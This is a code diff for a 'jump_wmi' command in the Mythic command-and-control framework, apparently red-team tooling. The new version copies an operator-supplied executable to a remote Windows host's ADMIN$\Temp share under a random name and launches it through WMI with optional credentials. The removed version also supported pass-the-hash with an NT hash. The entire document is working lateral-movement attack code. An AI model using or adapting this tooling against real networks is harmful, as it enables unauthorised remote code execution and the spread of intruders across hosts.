@@ -1,7 +1,8 @@
-import random
-import string
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
+import json
+import random
+import string
 
 
 class JumpWmiArguments(TaskArguments):
@@ -14,9 +15,7 @@ class JumpWmiArguments(TaskArguments):
                 display_name="Target",
                 type=ParameterType.String,
                 description="Hostname or IP address of the remote target.",
-                parameter_group_info=[
-                    ParameterGroupInfo(required=True, ui_position=1)
-                ]
+                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
             ),
             CommandParameter(
                 name="payload",
@@ -24,56 +23,43 @@ class JumpWmiArguments(TaskArguments):
                 display_name="Payload",
                 type=ParameterType.File,
                 description="Executable to upload and run on the remote host.",
-                parameter_group_info=[
-                    ParameterGroupInfo(required=True, ui_position=2)
-                ]
+                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=2)],
             ),
             CommandParameter(
                 name="command",
                 cli_name="Command",
                 display_name="Extra Arguments",
                 type=ParameterType.String,
-                description="Optional arguments to append to the executed binary path.",
+                description="Optional arguments to append to the uploaded binary.",
                 default_value="",
-                parameter_group_info=[
-                    ParameterGroupInfo(required=False, ui_position=3)
-                ]
+                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
             ),
             CommandParameter(
                 name="username",
                 cli_name="Username",
                 display_name="Username",
                 type=ParameterType.String,
-                description=(
-                    "Optional: DOMAIN\\\\User to authenticate with. "
-                    "Leave blank to use the current process/thread token."
-                ),
+                description="Optional username for WMIC auth.",
                 default_value="",
-                parameter_group_info=[
-                    ParameterGroupInfo(required=False, ui_position=4)
-                ]
+                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=4)],
             ),
             CommandParameter(
                 name="password",
                 cli_name="Password",
                 display_name="Password",
                 type=ParameterType.String,
-                description="Optional: Password for the specified user.",
+                description="Optional password for WMIC auth.",
                 default_value="",
-                parameter_group_info=[
-                    ParameterGroupInfo(required=False, ui_position=5)
-                ]
+                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=5)],
             ),
             CommandParameter(
-                name="hash",
-                cli_name="Hash",
-                display_name="NT Hash",
+                name="domain",
+                cli_name="Domain",
+                display_name="Domain",
                 type=ParameterType.String,
-                description="Optional: NT hash (hex) for pass-the-hash authentication. Supply instead of Password.",
+                description="Optional domain for WMIC auth.",
                 default_value="",
-                parameter_group_info=[
-                    ParameterGroupInfo(required=False, ui_position=6)
-                ]
+                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=6)],
             ),
         ]
 
@@ -84,59 +70,121 @@ class JumpWmiArguments(TaskArguments):
         self.load_args_from_dictionary(dictionary_arguments)
 
 
+async def mirror_up_output(task: PTTaskCompletionFunctionMessage):
+    response_search = await SendMythicRPCResponseSearch(
+        MythicRPCResponseSearchMessage(TaskID=task.SubtaskData.Task.ID)
+    )
+    if response_search.Success:
+        for r in response_search.Responses:
+            await SendMythicRPCResponseCreate(
+                MythicRPCResponseCreateMessage(
+                    TaskID=task.TaskData.Task.ID,
+                    Response=r.Response.encode(),
+                )
+            )
+        await SendMythicRPCResponseCreate(
+            MythicRPCResponseCreateMessage(
+                TaskID=task.TaskData.Task.ID,
+                Response="\n".encode(),
+            )
+        )
+
+
+async def wmi_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
+    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
+    await mirror_up_output(task=task)
+    if "error" in task.SubtaskData.Task.Status.lower():
+        response.TaskStatus = "error: failed to execute wmi"
+    return response
+
+
+async def upload_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
+    response = PTTaskCompletionFunctionMessageResponse(Success=True)
+    await mirror_up_output(task=task)
+    if "error" in task.SubtaskData.Task.Status.lower():
+        response.TaskStatus = "error: failed to copy over file"
+        return response
+
+    await SendMythicRPCTaskUpdate(
+        MythicRPCTaskUpdateMessage(
+            TaskID=task.TaskData.Task.ID,
+            UpdateStatus="executing wmi...",
+        )
+    )
+
+    params = {
+        "command": task.TaskData.args.get_arg("_lm_exec_cmd"),
+        "host": task.TaskData.args.get_arg("target"),
+    }
+    username = task.TaskData.args.get_arg("username") or ""
+    password = task.TaskData.args.get_arg("password") or ""
+    domain = task.TaskData.args.get_arg("domain") or ""
+    if username:
+        params["username"] = username
+    if password:
+        params["password"] = password
+    if domain:
+        params["domain"] = domain
+
+    await SendMythicRPCTaskCreateSubtask(
+        MythicRPCTaskCreateSubtaskMessage(
+            TaskID=task.TaskData.Task.ID,
+            SubtaskCallbackFunction="wmi_callback",
+            CommandName="wmiexecute",
+            Params=json.dumps(params),
+        )
+    )
+    return response
+
+
 class JumpWmiCommand(CommandBase):
     cmd = "jump_wmi"
-    needs_admin = False
-    help_cmd = "jump_wmi -Target <host> -Payload <file> [-Command <extra args>] [-Username DOMAIN\\user] [-Password pass | -Hash NTHASH]"
-    description = (
-        "Lateral movement via WMI Win32_Process::Create over DCOM. "
-        "Uploads a payload to the remote host's ADMIN$\\Temp share under a random 10-character name, "
-        "then spawns it via Win32_Process::Create. "
-        "Optionally authenticate with explicit credentials or an NT hash (pass-the-hash); "
-        "otherwise the current token is used."
-    )
-    version = 1
+    attributes = CommandAttributes(dependencies=["upload", "wmiexecute"])
+    needs_admin = True
+    help_cmd = "jump_wmi -Target <host> -Payload <file>"
+    description = "Lateral movement workflow: upload payload, then execute via wmiexecute."
+    version = 2
+    script_only = True
     author = "@Lavender-exe"
-    attackmapping = ["T1021.006", "T1047"]
     argument_class = JumpWmiArguments
-    attributes = CommandAttributes(
-        builtin=False,
-        supported_os=[SupportedOS.Windows],
-        suggested_command=False,
-    )
+    attackmapping = ["T1021.006", "T1047"]
+    completion_functions = {
+        "upload_callback": upload_callback,
+        "wmi_callback": wmi_callback,
+    }
 
     async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
-        response = PTTaskCreateTaskingMessageResponse(
-            TaskID=taskData.Task.ID,
-            Success=True,
+        response = PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)
+
+        target = taskData.args.get_arg("target")
+        file_id = taskData.args.get_arg("payload")
+        extra_args = taskData.args.get_arg("command") or ""
+
+        rand_name = "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + ".exe"
+        remote_unc = f"\\\\{target}\\ADMIN$\\Temp\\{rand_name}"
+        exec_cmd = f"C:\\Windows\\Temp\\{rand_name}"
+        if extra_args:
+            exec_cmd += f" {extra_args}"
+
+        taskData.args.add_arg("_lm_exec_cmd", exec_cmd)
+
+        response.DisplayParams = f"{target} -> {remote_unc}"
+        response.TaskStatus = "uploading file..."
+
+        await SendMythicRPCTaskCreateSubtask(
+            MythicRPCTaskCreateSubtaskMessage(
+                TaskID=taskData.Task.ID,
+                SubtaskCallbackFunction="upload_callback",
+                CommandName="upload",
+                Params=json.dumps(
+                    {
+                        "remote_path": remote_unc,
+                        "file": file_id,
+                    }
+                ),
+            )
         )
-        try:
-            target  = taskData.args.get_arg("target")
-            file_id = taskData.args.get_arg("payload")
-            password = taskData.args.get_arg("password") or ""
-            hash_val = taskData.args.get_arg("hash") or ""
-
-            if password and hash_val:
-                raise Exception("Supply either Password or Hash, not both.")
-
-            rand_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + ".exe"
-
-            taskData.args.remove_arg("payload")
-            taskData.args.add_arg("file_name", rand_name)
-            taskData.args.add_arg("file_id", file_id)
-
-            auth_note = ""
-            username = taskData.args.get_arg("username") or ""
-            if hash_val and username:
-                auth_note = f" [PTH: {username}]"
-            elif password and username:
-                auth_note = f" [creds: {username}]"
-
-            response.DisplayParams = f"{target} -> \\\\{target}\\ADMIN$\\Temp\\{rand_name}{auth_note}"
-        except Exception as e:
-            raise Exception(str(e))
         return response
 
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
-        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
-        return resp
+        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
